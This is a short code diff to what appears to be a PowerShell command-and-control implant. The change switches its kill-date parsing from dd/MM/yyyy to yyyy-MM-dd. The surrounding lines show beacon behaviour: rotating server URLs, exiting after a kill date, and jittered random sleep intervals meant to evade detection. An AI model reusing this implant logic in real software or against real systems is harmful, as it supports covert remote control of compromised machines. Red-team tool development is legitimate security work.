@@ -246,9 +246,9 @@ while($true)
     } else {
         $ServerURLS = $rotate
     }
-    $date = (Get-Date -Format "dd/MM/yyyy")
-    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
-    $killdate = [datetime]::ParseExact("%s","dd/MM/yyyy",$null)
+    $date = (Get-Date -Format "yyyy-MM-dd")
+    $date = [datetime]::ParseExact($date,"yyyy-MM-dd",$null)
+    $killdate = [datetime]::ParseExact("%s","yyyy-MM-dd",$null)
     if ($killdate -lt $date) {exit}
     $sleeptimeran = ([int]$sleeptime * (1 + $Jitter))..([int]$sleeptime * (1 - $Jitter))
     $newsleep = $sleeptimeran|get-random
